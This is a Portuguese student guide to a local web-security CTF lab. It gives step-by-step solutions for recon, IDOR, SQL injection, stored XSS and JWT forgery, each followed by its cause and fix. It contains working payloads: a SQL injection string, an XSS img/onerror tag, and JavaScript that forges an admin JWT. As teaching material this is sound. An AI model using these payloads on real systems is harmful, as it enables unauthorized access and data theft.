# Guia do Aluno — VAULT CTF

Faça tudo **logado como Ana** (`cliente@vault.local` / `exemplo123`).
Ferramentas: navegador + **Burp Suite** (proxy em `127.0.0.1:8080`). Alvo: `http://127.0.0.1:8099`.
Cole cada flag em **`/ctf`**. Entregável por desafio: *request + response + causa + como corrigir*.

---

## 1) RECON — 100 pts
- Abra `http://127.0.0.1:8099/robots.txt`. Ele pede para "não indexar" um caminho interno.
- Acesse esse caminho (`/api/internal/diag`). O JSON traz `evidence: VAULT{RECON_...}`.
- **Causa:** endpoint de diagnóstico exposto. **Correção:** não publicar endpoints internos (no modo seguro ele vira 404).

## 2) IDOR — 150 pts
- No **Extrato**, consulte a transação `2001` (sua). Capture `GET /api/transactions/2001` no Burp.
- No **Repeater**, troque `2001` por `2002` (transação de outro cliente) e envie.
- Resposta `200` com `owner_id: cliente-b` e `evidence: VAULT{IDOR_...}`.
- **Causa:** `WHERE id=?` sem checar o dono. **Correção:** `WHERE id=? AND owner_id=?`.

## 3) SQL Injection — 200 pts
- Capture `GET /api/search?q=padaria`. No Repeater, troque o `q` por `' OR '1'='1`
  (URL-encodado: `%27%20OR%20%271%27%3D%271`).
- Aparece o beneficiário oculto `#99` com `VAULT{SQLI_...}`.
- **Causa:** a entrada é concatenada na query. **Correção:** query parametrizada (`LIKE ?`).

## 4) XSS armazenado — 200 pts
- Em **Mensagens**, publique: `<img src=x onerror="vaultProofXSS()">`
- Ao renderizar, a função roda e a flag `VAULT{XSS_...}` aparece na caixa de prova.
- **Causa:** mensagem renderizada como HTML (`innerHTML`). **Correção:** `textContent` + CSP.

## 5) Falha de autenticação (JWT) — 250 pts
- Em **/admin**, clique **LER PAYLOAD** (role = `client`) e **SOLICITAR RELATÓRIO** → `403`.
- Abra o Console do navegador (F12) e forje o token mantendo a assinatura:
  ```js
  const t = document.querySelector('#jwt').value;
  const [h,p,s] = t.split('.');
  const d = JSON.parse(atob(p.replace(/-/g,'+').replace(/_/g,'/')));
  d.role = 'admin';
  const np = btoa(JSON.stringify(d)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
  console.log(`${h}.${np}.${s}`);
  ```
- Cole o token forjado na caixa, **LER PAYLOAD** (agora `admin`) e **SOLICITAR RELATÓRIO** → `200` + `VAULT{AUTH_...}`.
- **Causa:** o servidor confia na claim `role` sem verificar a assinatura. **Correção:** verificar a assinatura **e** conferir a role real no banco.

---

Validou as 5? Placar em **900/900** no `/ctf`. 🏁
